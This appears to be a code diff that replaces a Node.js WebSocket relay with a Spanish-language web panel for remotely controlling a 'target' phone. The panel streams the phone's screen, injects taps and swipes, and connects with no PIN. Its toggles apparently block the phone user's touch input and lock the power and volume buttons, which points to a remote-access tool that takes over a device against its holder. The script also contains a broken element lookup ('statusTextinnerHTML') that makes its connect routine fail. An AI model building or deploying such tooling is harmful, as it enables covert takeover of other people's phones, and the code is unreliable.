@@ -1,120 +1,255 @@
-const express = require('express');
-const http = require('http');
-const WebSocket = require('ws');
-const path = require('path');
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Panel de Control Remoto Automático</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #121214;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    h1 { margin-bottom: 20px; color: #a855f7; }
+    .panel-controles {
+      background: #1e1e24;
+      padding: 15px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      display: none;
+      gap: 12px;
+      margin-bottom: 16px;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 14px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      background: #a855f7;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover { background: #9333ea; }
+    .btn-danger { background: #ef4444; }
+    .btn-danger:hover { background: #dc2626; }
+    .btn-success { background: #22c55e; }
+    .btn-success:hover { background: #16a34a; }
+    .status { margin-bottom: 16px; font-size: 14px; color: #fbbf24; font-weight: bold; }
+    
+    .phone-container { display: none; flex-direction: column; align-items: center; }
+    .phone-frame {
+      border: 12px solid #27272a;
+      border-radius: 36px;
+      background-color: #000;
+      position: relative;
+      cursor: crosshair;
+      box-shadow: 0 0 30px rgba(168, 85, 247, 0.2);
+      user-select: none;
+      overflow: hidden;
+    }
+    .phone-stream-img {
+      width: 100%;
+      height: 100%;
+      object-fit: fill;
+      pointer-events: none;
+      display: block;
+    }
+    .phone-screen-placeholder {
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      display: flex; flex-direction: column; justify-content: center; align-items: center;
+      color: #52525b; font-size: 14px; pointer-events: none;
+    }
+  </style>
+</head>
+<body onload="conectarWebSocket()">
 
-const app = express();
-const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
+  <h1>📱 Panel de Control Automático</h1>
 
-// Servir archivos estáticos (el panel web en public/)
-app.use(express.static(path.join(__dirname, 'public')));
+  <div class="status" id="statusText">🔄 Buscando conexión y dispositivo...</div>
 
-// Instancias globales para conexión única directa (sin PIN)
-let celularObjetivo = null;
-let panelWebControlador = null;
+  <!-- Panel de Interruptores Remotos -->
+  <div class="panel-controles" id="panelControles">
+    <button id="btnBypass" class="btn-success" onclick="alternarBypass()">Activar Bypass (Anti-Táctil)</button>
+    <button id="btnBotones" class="btn-success" onclick="alternarBotones()">Bloquear Power / Volumen</button>
+  </div>
 
-wss.on('connection', (ws) => {
-  let tipoCliente = null; // 'CELULAR' o 'WEB'
+  <div class="phone-container" id="phoneContainer">
+    <div class="phone-frame" id="phoneFrame">
+      <img id="streamVideo" class="phone-stream-img" src="" alt="Cargando video..." />
+      <div class="phone-screen-placeholder" id="placeholderText">
+        <p>📱 ESPERANDO SEÑAL DE VIDEO</p>
+        <p id="resInfo" style="font-size: 11px; margin-top: 8px;"></p>
+      </div>
+    </div>
+  </div>
 
-  ws.on('message', (message) => {
-    try {
-      const data = JSON.parse(message);
+  <script>
+    let ws = null;
+    let realWidth = 1080;
+    let realHeight = 2400;
 
-      // 1. EL CELULAR SE REGISTRA AUTOMÁTICAMENTE COMO OBJETIVO
-      if (data.type === 'REGISTRAR_OBJETIVO') {
-        tipoCliente = 'CELULAR';
-        celularObjetivo = ws;
-        celularObjetivo.width = data.width || 1080;
-        celularObjetivo.height = data.height || 2400;
+    let isMouseDown = false;
+    let startX = 0;
+    let startY = 0;
 
-        console.log(`[CELULAR CONECTADO] Resolución registrada: ${celularObjetivo.width}x${celularObjetivo.height}`);
+    let bypassEstado = false;
+    let botonesEstado = false;
+    let intentoReconexionTimer = null;
 
-        // Si la web ya estaba esperando, le avisamos de inmediato que hay conexión exitosa
-        if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
-          panelWebControlador.send(JSON.stringify({
-            type: 'CONEXION_EXITOSA',
-            width: celularObjetivo.width,
-            height: celularObjetivo.height
-          }));
-        }
+    function conectarWebSocket() {
+      // Mostrar estado dinámico de búsqueda constante
+      document.getElementById('statusTextinnerHTML').innerText = '';
+      const statusEl = document.getElementById('statusText');
+      statusEl.style.color = '#fbbf24';
+
+      if (ws) {
+        try { ws.close(); } catch(e) {}
       }
 
-      // 2. EL PANEL WEB SE CONECTA DE FORMA AUTOMÁTICA
-      else if (data.type === 'CONECTAR_DESDE_WEB_AUTO') {
-        tipoCliente = 'WEB';
-        panelWebControlador = ws;
+      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${protocol}//${location.host}`);
 
-        if (celularObjetivo && celularObjetivo.readyState === WebSocket.OPEN) {
-          ws.send(JSON.stringify({
-            type: 'CONEXION_EXITOSA',
-            width: celularObjetivo.width,
-            height: celularObjetivo.height
-          }));
-          console.log(`[PANEL WEB CONECTADO] Vinculado automáticamente al celular.`);
-        } else {
-          ws.send(JSON.stringify({
-            type: 'ERROR',
-            mensaje: 'Esperando a que el celular se conecte...'
-          }));
-          console.log(`[PANEL WEB CONECTADO] Esperando celular objetivo...`);
-        }
-      }
+      ws.onopen = () => {
+        statusEl.innerText = `🔄 Sincronizando con el servidor...`;
+        ws.send(JSON.stringify({ type: 'CONECTAR_DESDE_WEB_AUTO' }));
+      };
 
-      // 3. REENVIAR ACCIONES TÁCTILES Y COMANDOS DE CONTROL (DEL WEB AL CELULAR)
-      else if (
-        data.type === 'ENVIAR_TOQUE' || 
-        data.type === 'ENVIAR_GESTO' || 
-        data.type === 'SET_BYPASS' || 
-        data.type === 'SET_BOTONES' || 
-        data.type === 'SET_PRIVACIDAD' ||
-        data.accion
-      ) {
-        if (celularObjetivo && celularObjetivo.readyState === WebSocket.OPEN) {
-          celularObjetivo.send(message);
-        }
-      }
+      ws.onmessage = (event) => {
+        const data = JSON.parse(event.data);
 
-      // 4. REENVIAR STREAM DE VIDEO (DEL CELULAR AL WEB) OPTIMIZADO PARA FLUJO EN TIEMPO REAL
-      else if (data.type === 'STREAM_FRAME') {
-        if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
+        if (data.type === 'CONEXION_EXITOSA') {
+          realWidth = data.width || 1080;
+          realHeight = data.height || 2400;
+
+          statusEl.innerText = `✅ Conectado y en línea (${realWidth}x${realHeight} px)`;
+          statusEl.style.color = '#4ade80';
+
+          document.getElementById('panelControles').style.display = 'flex';
+          configurarPantallaVirtual();
+        } 
+        else if (data.type === 'STREAM_FRAME') {
+          const imgElement = document.getElementById('streamVideo');
+          const placeholder = document.getElementById('placeholderText');
           
-          // Filtro de fluidez: si hay más de 64KB acumulados en la cola de red de la PC,
-          // descartamos este frame para que nunca se atrase el video (cámara lenta).
-          if (panelWebControlador.bufferedAmount > 65536) {
-            return;
+          if (imgElement && data.frame) {
+            imgElement.src = 'data:image/jpeg;base64,' + data.frame;
+            if (placeholder) placeholder.style.display = 'none';
           }
-
-          panelWebControlador.send(JSON.stringify({
-            type: 'STREAM_FRAME',
-            frame: data.frame
-          }));
+        } 
+        else if (data.type === 'ERROR') {
+          statusEl.innerText = `⚠️ ${data.mensaje} (Buscando celular activamente...)`;
+          statusEl.style.color = '#fbbf24';
         }
-      }
-    } catch (err) {
-      console.error("Error al procesar mensaje:", err);
-    }
-  });
+      };
 
-  ws.on('close', () => {
-    if (tipoCliente === 'CELULAR') {
-      console.log(`[CELULAR DESCONECTADO] Sesión liberada.`);
-      celularObjetivo = null;
-      // Notificar a la web si está abierta
-      if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
-        panelWebControlador.send(JSON.stringify({
-          type: 'ERROR',
-          mensaje: 'El celular se ha desconectado.'
-        }));
-      }
-    } else if (tipoCliente === 'WEB') {
-      console.log(`[PANEL WEB DESCONECTADO].`);
-      panelWebControlador = null;
-    }
-  });
-});
+      ws.onclose = () => {
+        statusEl.innerText = `⚠️ Desconectado. Reintentando conexión cada 0.5s...`;
+        statusEl.style.color = '#f87171';
+        
+        document.getElementById('panelControles').style.display = 'none';
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-  console.log(`Servidor iniciado en el puerto ${PORT}`);
-});
+        // Reintento agresivo y constante cada 500 milisegundos (medio segundo)
+        clearTimeout(intentoReconexionTimer);
+        intentoReconexionTimer = setTimeout(() => {
+          conectarWebSocket();
+        }, 500);
+      };
+
+      ws.onerror = () => {
+        try { ws.close(); } catch(e) {}
+      };
+    }
+
+    function alternarBypass() {
+      if (!ws || ws.readyState !== WebSocket.OPEN) return;
+      bypassEstado = !bypassEstado;
+      ws.send(JSON.stringify({ type: 'SET_BYPASS', activar: bypassEstado }));
+
+      const btn = document.getElementById('btnBypass');
+      if (bypassEstado) {
+        btn.innerText = 'Desactivar Bypass (Anti-Táctil)';
+        btn.className = 'btn-danger';
+      } else {
+        btn.innerText = 'Activar Bypass (Anti-Táctil)';
+        btn.className = 'btn-success';
+      }
+    }
+
+    function alternarBotones() {
+      if (!ws || ws.readyState !== WebSocket.OPEN) return;
+      botonesEstado = !botonesEstado;
+      ws.send(JSON.stringify({ type: 'SET_BOTONES', activar: botonesEstado }));
+
+      const btn = document.getElementById('btnBotones');
+      if (botonesEstado) {
+        btn.innerText = 'Desbloquear Power / Volumen';
+        btn.className = 'btn-danger';
+      } else {
+        btn.innerText = 'Bloquear Power / Volumen';
+        btn.className = 'btn-success';
+      }
+    }
+
+    function configurarPantallaVirtual() {
+      const frame = document.getElementById('phoneFrame');
+      const container = document.getElementById('phoneContainer');
+
+      const displayHeight = 580;
+      const displayWidth = Math.round((realWidth / realHeight) * displayHeight);
+
+      frame.style.width = `${displayWidth}px`;
+      frame.style.height = `${displayHeight}px`;
+
+      document.getElementById('resInfo').innerText = `Relación real: ${realWidth}x${realHeight}px`;
+      container.style.display = 'flex';
+
+      frame.onmousedown = (e) => {
+        isMouseDown = true;
+        const rect = frame.getBoundingClientRect();
+        startX = e.clientX - rect.left;
+        startY = e.clientY - rect.top;
+      };
+
+      frame.onmouseup = (e) => {
+        if (!isMouseDown) return;
+        isMouseDown = false;
+
+        if (!ws || ws.readyState !== WebSocket.OPEN) return;
+
+        const rect = frame.getBoundingClientRect();
+        const endX = e.clientX - rect.left;
+        const endY = e.clientY - rect.top;
+
+        const deltaX = Math.abs(endX - startX);
+        const deltaY = Math.abs(endY - startY);
+
+        if (deltaX < 5 && deltaY < 5) {
+          const xReal = (startX / displayWidth) * realWidth;
+          const yReal = (startY / displayHeight) * realHeight;
+
+          ws.send(JSON.stringify({ type: 'ENVIAR_TOQUE', x: xReal, y: yReal }));
+        } else {
+          const x1Real = (startX / displayWidth) * realWidth;
+          const y1Real = (startY / displayHeight) * realHeight;
+          const x2Real = (endX / displayWidth) * realWidth;
+          const y2Real = (endY / displayHeight) * realHeight;
+
+          ws.send(JSON.stringify({ type: 'ENVIAR_GESTO', xInicial: x1Real, yInicial: y1Real, xFinal: x2Real, yFinal: y2Real, duracion: 180 }));
+        }
+      };
+    }
+  </script>
+</body>
+</html>
